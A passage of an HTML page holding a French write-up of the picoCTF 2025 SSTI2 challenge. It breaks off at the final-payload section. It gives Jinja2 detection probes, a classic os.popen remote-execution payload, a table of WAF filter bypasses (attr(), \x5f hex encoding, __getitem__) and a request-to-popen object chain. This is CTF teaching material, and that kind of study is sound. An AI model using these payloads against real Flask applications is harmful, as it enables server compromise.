@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SSTI2 — picoCTF 2025 | Write-up by Yahaya Meddy</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:        #080c18;
+    --surface:   #0f1525;
+    --surface2:  #151d30;
+    --border:    #1e2a42;
+    --cyan:      #00d4aa;
+    --cyan-dim:  #00d4aa22;
+    --cyan-glow: #00d4aa44;
+    --red:       #ff4757;
+    --amber:     #ffa502;
+    --purple:    #a855f7;
+    --text:      #e2e8f4;
+    --muted:     #6b7a99;
+    --code-bg:   #060a14;
+  }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 16px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* ── SCANLINES OVERLAY ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,.08) 2px,
+      rgba(0,0,0,.08) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── LAYOUT ── */
+  .layout { display: flex; min-height: 100vh; }
+
+  /* ── SIDEBAR TIMELINE ── */
+  .sidebar {
+    position: fixed;
+    left: 0; top: 0;
+    width: 64px;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 0;
+    z-index: 100;
+    padding: 2rem 0;
+  }
+
+  .sidebar-line {
+    width: 1px;
+    flex: 1;
+    background: var(--border);
+  }
+
+  .phase-dot {
+    width: 32px; height: 32px;
+    border-radius: 50%;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+    cursor: pointer;
+    transition: all .3s;
+    text-decoration: none;
+    flex-shrink: 0;
+  }
+  .phase-dot:hover,
+  .phase-dot.active {
+    border-color: var(--cyan);
+    color: var(--cyan);
+    box-shadow: 0 0 12px var(--cyan-glow);
+    background: var(--cyan-dim);
+  }
+
+  /* ── MAIN CONTENT ── */
+  main {
+    margin-left: 64px;
+    width: calc(100% - 64px);
+    padding: 0 2rem 6rem;
+  }
+
+  .inner { max-width: 860px; margin: 0 auto; }
+
+  /* ── HERO ── */
+  .hero {
+    padding: 5rem 0 4rem;
+    position: relative;
+  }
+
+  .hero-eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: .18em;
+    text-transform: uppercase;
+    color: var(--cyan);
+    margin-bottom: 1.5rem;
+    display: flex;
+    align-items: center;
+    gap: .75rem;
+  }
+  .hero-eyebrow::before {
+    content: '';
+    display: inline-block;
+    width: 24px; height: 1px;
+    background: var(--cyan);
+  }
+
+  .hero-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: clamp(2.4rem, 5vw, 3.8rem);
+    font-weight: 700;
+    line-height: 1.1;
+    letter-spacing: -.02em;
+    margin-bottom: 1rem;
+  }
+  .hero-title .accent { color: var(--cyan); }
+  .hero-title .dim    { color: var(--muted); font-weight: 300; }
+
+  .hero-sub {
+    font-size: 1.05rem;
+    color: var(--muted);
+    margin-bottom: 2.5rem;
+    max-width: 560px;
+  }
+
+  .meta-pills {
+    display: flex; flex-wrap: wrap; gap: .6rem;
+    margin-bottom: 2rem;
+  }
+  .pill {
+    padding: .3rem .9rem;
+    border-radius: 99px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: .08em;
+    font-weight: 500;
+  }
+  .pill-cyan   { border: 1px solid var(--cyan);   color: var(--cyan);   background: var(--cyan-dim); }
+  .pill-red    { border: 1px solid var(--red);    color: var(--red);    background: #ff475711; }
+  .pill-amber  { border: 1px solid var(--amber);  color: var(--amber);  background: #ffa50211; }
+  .pill-purple { border: 1px solid var(--purple); color: var(--purple); background: #a855f711; }
+
+  .hero-divider {
+    width: 100%; height: 1px;
+    background: linear-gradient(90deg, var(--cyan) 0%, var(--border) 60%, transparent 100%);
+    margin-top: 3rem;
+  }
+
+  /* ── SECTIONS ── */
+  .section {
+    padding: 3.5rem 0 2rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .section:last-of-type { border-bottom: none; }
+
+  .section-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: .2em;
+    text-transform: uppercase;
+    color: var(--cyan);
+    margin-bottom: .6rem;
+    display: flex; align-items: center; gap: .5rem;
+  }
+  .section-label span { color: var(--muted); }
+
+  .section-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 1.45rem;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 1.5rem;
+    line-height: 1.3;
+  }
+
+  .subsection-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 1rem;
+    font-weight: 600;
+    color: var(--cyan);
+    margin: 2rem 0 .8rem;
+    padding-left: 1rem;
+    border-left: 2px solid var(--cyan);
+  }
+
+  p { margin-bottom: 1rem; color: #b8c3d9; }
+  p strong { color: var(--text); font-weight: 600; }
+
+  /* ── TERMINAL FRAME (images) ── */
+  .terminal-frame {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 1.5rem 0;
+    box-shadow: 0 8px 40px rgba(0,0,0,.5), 0 0 0 1px rgba(0,212,170,.06);
+  }
+
+  .terminal-bar {
+    background: var(--surface2);
+    padding: .6rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .5rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .t-dot {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .t-dot-red    { background: #ff5f57; }
+  .t-dot-amber  { background: #ffbd2e; }
+  .t-dot-green  { background: #28c840; }
+
+  .terminal-bar-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    margin-left: .5rem;
+  }
+
+  .terminal-frame img {
+    width: 100%;
+    display: block;
+    /* Remove default whitespace */
+    vertical-align: top;
+  }
+
+  .terminal-caption {
+    padding: .6rem 1rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    background: var(--surface2);
+    border-top: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: .5rem;
+  }
+  .terminal-caption::before {
+    content: '▸';
+    color: var(--cyan);
+  }
+
+  /* ── CODE BLOCKS ── */
+  .code-wrap {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin: 1rem 0 1.5rem;
+    position: relative;
+  }
+
+  .code-header {
+    background: var(--surface2);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--cyan);
+  }
+
+  .copy-btn {
+    background: none;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: .2rem .6rem;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all .2s;
+  }
+  .copy-btn:hover { border-color: var(--cyan); color: var(--cyan); }
+
+  .code-wrap pre {
+    padding: 1.1rem 1.2rem;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .82rem;
+    line-height: 1.7;
+    color: #c0cce8;
+  }
+
+  .code-wrap pre .kw  { color: var(--cyan); }
+  .code-wrap pre .str { color: #ffdd87; }
+  .code-wrap pre .op  { color: var(--red); }
+  .code-wrap pre .cmt { color: var(--muted); font-style: italic; }
+
+  /* ── RESULT BADGE ── */
+  .result-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: .5rem;
+    background: #00d4aa0f;
+    border: 1px solid var(--cyan);
+    border-radius: 6px;
+    padding: .5rem 1rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .82rem;
+    color: var(--cyan);
+    margin: .5rem 0 1rem;
+  }
+  .result-badge::before { content: '✓'; font-weight: 700; }
+
+  .blocked-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: .5rem;
+    background: #ff47570f;
+    border: 1px solid var(--red);
+    border-radius: 6px;
+    padding: .5rem 1rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .82rem;
+    color: var(--red);
+    margin: .5rem 0 1rem;
+  }
+  .blocked-badge::before { content: '✗'; font-weight: 700; }
+
+  /* ── TABLES ── */
+  .table-wrap {
+    overflow-x: auto;
+    margin: 1.2rem 0 1.8rem;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: .875rem;
+  }
+
+  thead tr {
+    background: var(--surface2);
+  }
+  thead th {
+    padding: .75rem 1.1rem;
+    text-align: left;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .75rem;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    color: var(--cyan);
+    font-weight: 500;
+    border-bottom: 1px solid var(--border);
+    white-space: nowrap;
+  }
+
+  tbody tr {
+    border-bottom: 1px solid var(--border);
+    transition: background .15s;
+  }
+  tbody tr:last-child { border-bottom: none; }
+  tbody tr:hover { background: var(--surface); }
+
+  tbody td {
+    padding: .75rem 1.1rem;
+    color: #b8c3d9;
+    vertical-align: top;
+  }
+
+  tbody td:first-child {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .8rem;
+    color: var(--amber);
+  }
+
+  td code, p code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .82em;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: .1em .4em;
+    color: #c0cce8;
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.1rem 1.3rem;
+    margin: 1rem 0 1.5rem;
+  }
+
+  .chain-node {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .78rem;
+    color: var(--text);
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: .3rem .7rem;
+  }
+  .chain-arrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .9rem;
+    color: var(--cyan);
+  }
+  .chain-node.highlight {
+    border-color: var(--cyan);
+    color: var(--cyan);
+    background: var(--cyan-dim);
+  }
+
+  /* ── BLOCKQUOTE (WAF message) ── */
+  blockquote {
+    background: #ff475709;
+    border-left: 3px solid var(--red);
+    border-radius: 0 6px 6px 0;
+    padding: .9rem 1.2rem;
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .875rem;
+    color: var(--red);
+  }
+
+  /* ── SECURITY RECS ── */
+  .rec-list { list-style: none; margin: .5rem 0; }
+  .rec-list li {
+    display: flex;
+    gap: .8rem;
+    align-items: flex-start;
+    padding: .9rem 0;
+    border-bottom: 1px solid var(--border);
+    color: #b8c3d9;
+  }
+  .rec-list li:last-child { border-bottom: none; }
+  .rec-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .75rem;
+    color: var(--cyan);
+    background: var(--cyan-dim);
+    border: 1px solid var(--cyan);
+    border-radius: 4px;
+    padding: .1rem .5rem;
+    flex-shrink: 0;
+    margin-top: .1rem;
+  }
+
+  /* ── REFS ── */
+  .ref-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+    gap: .8rem;
+    margin-top: 1rem;
+  }
+  .ref-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    text-decoration: none;
+    display: flex;
+    flex-direction: column;
+    gap: .3rem;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  .ref-card:hover {
+    border-color: var(--cyan);
+    box-shadow: 0 0 20px var(--cyan-glow);
+  }
+  .ref-icon {
+    font-size: 1.1rem;
+    margin-bottom: .2rem;
+  }
+  .ref-name {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .8rem;
+    color: var(--cyan);
+    font-weight: 600;
+  }
+  .ref-url {
+    font-size: .75rem;
+    color: var(--muted);
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  /* ── FLAG BOX ── */
+  .flag-box {
+    background: linear-gradient(135deg, #00d4aa0a 0%, #00d4aa03 100%);
+    border: 1px solid var(--cyan);
+    border-radius: 10px;
+    padding: 1.8rem 2rem;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    margin: 1.5rem 0;
+  }
+  .flag-box::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at 50% 0%, var(--cyan-glow) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .flag-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: .2em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: .8rem;
+  }
+  .flag-text {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--cyan);
+    letter-spacing: .05em;
+    text-shadow: 0 0 20px var(--cyan-glow);
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    margin-top: 4rem;
+    padding: 2rem 0;
+    border-top: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+  .footer-author {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .8rem;
+    color: var(--muted);
+  }
+  .footer-author a {
+    color: var(--cyan);
+    text-decoration: none;
+  }
+  .footer-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .75rem;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .footer-badge span { color: var(--cyan); }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  /* ── RESPONSIVE ── */
+  @media (max-width: 640px) {
+    .sidebar { display: none; }
+    main { margin-left: 0; padding: 0 1.2rem 4rem; }
+    .hero-title { font-size: 1.8rem; }
+  }
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR TIMELINE -->
+<nav class="sidebar">
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s1" title="Définition">01</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s2" title="Analyse">02</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s3" title="WAF">03</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s4" title="Bypass">04</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s5" title="Exploit">05</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s6" title="Flag">06</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s7" title="Sécurité">07</a>
+  <div class="sidebar-line"></div>
+</nav>
+
+<main>
+<div class="inner">
+
+  <!-- HERO -->
+  <header class="hero">
+    <div class="hero-eyebrow">picoCTF 2025 · Web Exploitation · Write-up</div>
+    <h1 class="hero-title">
+      <span class="dim">SSTI</span><span class="accent">2</span><br>
+      <span class="dim" style="font-size:55%;">WAF Bypass via Jinja2</span>
+    </h1>
+    <p class="hero-sub">
+      Exploitation d'une injection de template côté serveur avec contournement de filtre —
+      encodage hexadécimal, filtre <code>attr()</code>, et chaîne d'attributs Flask.
+    </p>
+    <div class="meta-pills">
+      <span class="pill pill-cyan">Jinja2 / Flask</span>
+      <span class="pill pill-red">RCE</span>
+      <span class="pill pill-amber">200 pts · Moyen</span>
+      <span class="pill pill-purple">WAF Bypass</span>
+    </div>
+    <div class="hero-divider"></div>
+  </header>
+
+  <!-- 01 - DÉFINITION -->
+  <section class="section" id="s1">
+    <div class="section-label">Phase <span>01</span></div>
+    <h2 class="section-title">Qu'est-ce qu'une SSTI ?</h2>
+
+    <p>
+      Le <strong>Server-Side Template Injection</strong> est une vulnérabilité qui survient lorsqu'un attaquant injecte
+      du code directement dans le moteur de templating côté serveur. Contrairement à une XSS (exécution côté client),
+      ici le code s'exécute <em>sur le serveur</em>, avec toutes ses permissions système.
+    </p>
+    <p>
+      Les moteurs concernés — Jinja2, Twig, Freemarker, Pebble — permettent aux développeurs de générer du HTML
+      dynamique en fusionnant données et templates. Si l'entrée utilisateur n'est pas isolée du template lui-même,
+      tout ce que le moteur peut faire, l'attaquant peut le faire aussi.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">ssti_diagram.png — Arbre SSTI</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/6828ee60-aff0-4e6c-a575-7591f1d5a8da" alt="Diagramme SSTI — arbre de détection des moteurs" loading="lazy">
+      <div class="terminal-caption">Arbre de détection des moteurs de templates via payloads progressifs</div>
+    </div>
+
+    <p>
+      Dans ce challenge, l'application cible utilise <strong>Flask + Jinja2</strong>, le duo Python
+      le plus répandu dans les CTF web. Jinja2 évalue les expressions entre <code>{{ }}</code> — c'est
+      précisément ce vecteur que nous allons exploiter.
+    </p>
+  </section>
+
+  <!-- 02 - ANALYSE -->
+  <section class="section" id="s2">
+    <div class="section-label">Phase <span>02</span></div>
+    <h2 class="section-title">Analyse de l'application</h2>
+
+    <p>
+      En accédant à l'instance, on découvre un site de "prise de parole publique" : l'utilisateur saisit
+      un message et le serveur l'affiche. Ce comportement de réaffichage est immédiatement suspect —
+      l'entrée transite peut-être directement dans un template non assaini.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">app_interface.png — Interface cible</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/8e7a0644-3060-4775-aea9-a9f3b4962fc4" alt="Interface de l'application cible" loading="lazy">
+      <div class="terminal-caption">L'entrée utilisateur est réaffichée telle quelle dans la page</div>
+    </div>
+
+    <h3 class="subsection-title">2.1 — Détection : injection d'expression mathématique</h3>
+
+    <p>
+      La première sonde de tout pentest SSTI : injecter une expression que seul un moteur de template
+      évaluera. Si le serveur affiche <code>49</code> au lieu de la chaîne littérale <code>7*7</code>,
+      la SSTI est confirmée.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Payload de détection</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre>{{7*7}}</pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">probe_1_input.png</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/c47a32d6-14de-47c7-93ba-c83e50ef93da" alt="Payload 7*7 injecté" loading="lazy">
+      <div class="terminal-caption">Injection du payload — le moteur va-t-il évaluer l'expression ?</div>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">probe_1_result.png</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/25486a6b-ba3f-4eac-a51a-0a7c566de585" alt="Résultat 49 — SSTI confirmée" loading="lazy">
+      <div class="terminal-caption">Résultat : 49 — le serveur a exécuté la multiplication. SSTI confirmée.</div>
+    </div>
+
+    <div class="result-badge">Résultat : <code>49</code> — Expression évaluée côté serveur. SSTI présente.</div>
+
+    <h3 class="subsection-title">2.2 — Fingerprinting : confirmation Jinja2</h3>
+
+    <p>
+      Pour distinguer Jinja2 des autres moteurs, on exploite un comportement propre à Python :
+      multiplier une chaîne par un entier la répète. Ce comportement est spécifique à Jinja2/Python.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Fingerprint moteur</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre>{{ 10 * "10" }}</pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">probe_2_input.png</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/9a78711d-a27d-4e06-b62b-deca0a6cc87c" alt="Payload 10 * string" loading="lazy">
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">probe_2_result.png</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/5ed1e21f-b77c-4b3e-b668-6b60b63a03ff" alt="Résultat 10101010101010101010" loading="lazy">
+      <div class="terminal-caption">Résultat : 10101010101010101010 — comportement Python confirmé → Jinja2/Flask</div>
+    </div>
+
+    <div class="result-badge">Moteur identifié : Jinja2 (Flask / Python)</div>
+  </section>
+
+  <!-- 03 - WAF -->
+  <section class="section" id="s3">
+    <div class="section-label">Phase <span>03</span></div>
+    <h2 class="section-title">Rencontre avec le WAF</h2>
+
+    <p>
+      Fort de cette identification, on tente le payload SSTI classique pour obtenir une exécution de commande.
+      La technique standard remonte la chaîne d'objets Python jusqu'au module <code>os</code>.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Payload classique (bloqué)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">waf_block.png — Réponse du WAF</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/d9094398-c7db-4f32-9ce1-a71b7c34753e" alt="Réponse du WAF : Stop trying to break me" loading="lazy">
+      <div class="terminal-caption">Le WAF intercepte la requête et retourne un message de blocage</div>
+    </div>
+
+    <blockquote>Stop trying to break me &gt;:( </blockquote>
+
+    <div class="blocked-badge">Payload bloqué — WAF actif. Analyse des filtres nécessaire.</div>
+
+    <h3 class="subsection-title">3.1 — Cartographie des filtres</h3>
+
+    <p>
+      Après tests systématiques, on établit la liste des patterns interceptés par le WAF.
+      Chaque élément bloqué correspond à une technique de contournement à développer.
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Caractère / Motif</th>
+            <th>Impact</th>
+            <th>Technique de bypass</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>.</code> — point</td>
+            <td>Bloque l'accès aux attributs : <code>config.__class__</code></td>
+            <td>Filtre Jinja2 <code>attr()</code></td>
+          </tr>
+          <tr>
+            <td><code>_</code> — underscore</td>
+            <td>Bloque les dunders : <code>__globals__</code>, <code>__class__</code></td>
+            <td>Hex encoding <code>\x5f</code></td>
+          </tr>
+          <tr>
+            <td><code>[ ]</code> — crochets</td>
+            <td>Bloque l'accès aux dictionnaires : <code>['os']</code></td>
+            <td>Méthode <code>__getitem__</code></td>
+          </tr>
+          <tr>
+            <td><code>' "</code> — guillemets</td>
+            <td>Bloque les chaînes littérales</td>
+            <td>Hex encoding embarqué</td>
+          </tr>
+          <tr>
+            <td><code>join</code></td>
+            <td>Contournement classique via jointure de chaînes</td>
+            <td>Éviter <code>join</code></td>
+          </tr>
+          <tr>
+            <td><code>0x</code></td>
+            <td>Encodage hexadécimal direct bloqué</td>
+            <td>Notation <code>\x5f</code> dans strings</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 04 - BYPASS -->
+  <section class="section" id="s4">
+    <div class="section-label">Phase <span>04</span></div>
+    <h2 class="section-title">Techniques de Contournement</h2>
+
+    <h3 class="subsection-title">4.1 — Bypass du point avec <code>|attr()</code></h3>
+
+    <p>
+      Jinja2 expose un filtre natif <code>attr()</code> permettant d'accéder à un attribut par
+      son nom sous forme de chaîne. On remplace chaque <code>.</code> par un appel <code>|attr('nom')</code>.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Test attr()</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre>{{ 'foo'|attr('upper') }}<span class="cmt">  {# équivalent à : 'foo'.upper() #}</span></pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">attr_test.png</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/fb466451-f34d-4710-a115-64abe57929f7" alt="Test du filtre attr() — résultat FOO" loading="lazy">
+      <div class="terminal-caption">Résultat : FOO — upper() appelé via attr(), sans aucun point dans le payload</div>
+    </div>
+
+    <div class="result-badge">Résultat : <code>FOO</code> — Le point est entièrement contourné via <code>|attr()</code></div>
+
+    <h3 class="subsection-title">4.2 — Bypass des underscores avec l'encodage hexadécimal</h3>
+
+    <p>
+      Le WAF bloque le caractère <code>_</code>. En Python, les caractères peuvent être représentés
+      par leur valeur hexadécimale dans une chaîne : <code>_</code> vaut <code>\x5f</code>.
+      Cette notation passe le filtre texte mais est interprétée correctement par Python.
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Forme bloquée</th>
+            <th>Forme encodée (bypass)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td><code>__</code></td><td><code>\x5f\x5f</code></td></tr>
+          <tr><td><code>__class__</code></td><td><code>\x5f\x5fclass\x5f\x5f</code></td></tr>
+          <tr><td><code>__globals__</code></td><td><code>\x5f\x5fglobals\x5f\x5f</code></td></tr>
+          <tr><td><code>__builtins__</code></td><td><code>\x5f\x5fbuiltins\x5f\x5f</code></td></tr>
+          <tr><td><code>__import__</code></td><td><code>\x5f\x5fimport\x5f\x5f</code></td></tr>
+          <tr><td><code>__getitem__</code></td><td><code>\x5f\x5fgetitem\x5f\x5f</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 class="subsection-title">4.3 — Bypass des crochets avec <code>__getitem__</code></h3>
+
+    <p>
+      L'accès aux dictionnaires via <code>['clé']</code> est bloqué par le filtre sur les crochets.
+      On utilise à la place la méthode magique Python <code>__getitem__</code>, appelable via <code>attr()</code>.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Substitution crochets → getitem</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cmt"># Bloqué :</span>
+dict['__builtins__']
+
+<span class="cmt"># Bypass :</span>
+dict|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')</pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">getitem_test.png</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/e4e85597-0931-4111-98d7-e9d4cd26170d" alt="Test de __getitem__ via attr()" loading="lazy">
+      <div class="terminal-caption">__getitem__ via attr() — accès au dictionnaire sans crochets</div>
+    </div>
+
+    <h3 class="subsection-title">4.4 — Point d'entrée : l'objet <code>request</code> de Flask</h3>
+
+    <p>
+      L'objet <code>request</code> de Flask est injecté automatiquement dans tous les contextes de template.
+      Il donne accès à <code>request.application</code>, qui est l'objet application Flask lui-même —
+      et donc à ses <code>__globals__</code> Python.
+    </p>
+
+    <div class="chain">
+      <span class="chain-node highlight">request</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node">.application</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node">.__globals__</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node">__builtins__</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node">__import__</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node">os</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node highlight">.popen()</span>
+    </div>
+  </section>
+
+  <!-- 05 - EXPLOIT -->
+  <section class="section" id="s5">
+    <div class="section-label">Phase <span>05</span></div>
+    <h2 class="section-title">Exploitation — Payload Final</h2>
+
+    <h3 class="subsection-title">5.1 — Listing du répertoire (<code>ls -la</code>)</h3>
+
+    <p>
+      On assemble toutes les techniques de bypass en un seul payload : <code>attr()</code> remplace
+      les points, <code>\x5f</code> remplace les underscores, et <code>__getitem__</code> remplace
